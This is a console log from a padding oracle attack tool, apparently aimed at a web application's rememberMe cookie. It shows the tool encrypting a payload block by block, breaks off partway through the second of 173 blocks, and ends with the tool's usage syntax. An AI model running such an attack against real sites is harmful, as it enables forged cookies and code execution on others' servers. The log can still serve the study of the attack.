2019-11-20 18:12:01  [ main:0 ] - [ DEBUG ] -- Start encrypt data...
2019-11-20 18:12:01  [ main:3 ] - [ WARN ] -- You provide block's size is not equal blockSize,try to reset it...
2019-11-20 18:12:01  [ main:5 ] - [ INFO ] -- Total 173 blocks to encrypt
2019-11-20 18:12:03  [ main:2040 ] - [ DEBUG ] -- Current string => 0000000000000000000000000000007375757575757575757575757575757575, the 173 block
2019-11-20 18:12:05  [ main:3595 ] - [ DEBUG ] -- Current string => 00000000000000000000000000008d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:06  [ main:4573 ] - [ DEBUG ] -- Current string => 00000000000000000000000000598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:07  [ main:5315 ] - [ DEBUG ] -- Current string => 0000000000000000000000004e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:07  [ main:5380 ] - [ DEBUG ] -- Current string => 0000000000000000000000034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:07  [ main:5384 ] - [ DEBUG ] -- Current string => 0000000000000000000006034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:09  [ main:7480 ] - [ DEBUG ] -- Current string => 000000000000000000ce06034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:11  [ main:9953 ] - [ DEBUG ] -- Current string => 0000000000000000dace06034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:13  [ main:12069 ] - [ DEBUG ] -- Current string => 00000000000000acdace06034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:16  [ main:14527 ] - [ DEBUG ] -- Current string => 000000000000dcacdace06034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:17  [ main:15197 ] - [ DEBUG ] -- Current string => 000000000043dcacdace06034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:19  [ main:17563 ] - [ DEBUG ] -- Current string => 00000000d643dcacdace06034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:20  [ main:18278 ] - [ DEBUG ] -- Current string => 0000004bd643dcacdace06034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:20  [ main:18282 ] - [ DEBUG ] -- Current string => 00000e4bd643dcacdace06034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:22  [ main:20224 ] - [ DEBUG ] -- Current string => 00ce0e4bd643dcacdace06034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:24  [ main:22536 ] - [ DEBUG ] -- Current string => f3ce0e4bd643dcacdace06034e598d7375757575757575757575757575757575, the 173 block
2019-11-20 18:12:24  [ main:22538 ] - [ INFO ] -- Left 172 blocks to encrypt
2019-11-20 18:12:26  [ main:24619 ] - [ DEBUG ] -- Current string => 000000000000000000000000000000c4f2ce763ad63ddca1a2c90104495e8a74, the 172 block
2019-11-20 18:12:26  [ main:24955 ] - [ DEBUG ] -- Current string => 000000000000000000000000000020c4f2ce763ad63ddca1a2c90104495e8a74, the 172 block
2019-11-20 18:12:28  [ main:26778 ] - [ DEBUG ] -- Current string => 00000000000000000000000000bf20c4f2ce763ad63ddca1a2c90104495e8a74, the 172 block
2019-11-20 18:12:29  [ main:27582 ] - [ DEBUG ] -- Current string => 00000000000000000000000056bf20c4f2ce763ad63ddca1a2c90104495e8a74, the 172 block
2019-11-20 18:12:31  [ main:30013 ] - [ DEBUG ] -- Current string => 0000000000000000000000e656bf20c4f2ce763ad63ddca1a2c90104495e8a74, the 172 block
2019-11-20 18:12:32  [ main:30434 ] - [ DEBUG ] -- Current string => 000000000000000000002ce656bf20c4f2ce763ad63ddca1a2c90104495e8a74, the 172 block
2019-11-20 18:12:33  [ main:31638 ] - [ DEBUG ] -- Current string => 0000000000000000007d2ce656bf20c4f2ce763ad63ddca1a2c90104495e8a74, the 172 block
2019-11-20 18:20:28  [ main:0 ] - [ INFO ] -- Usage: java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath
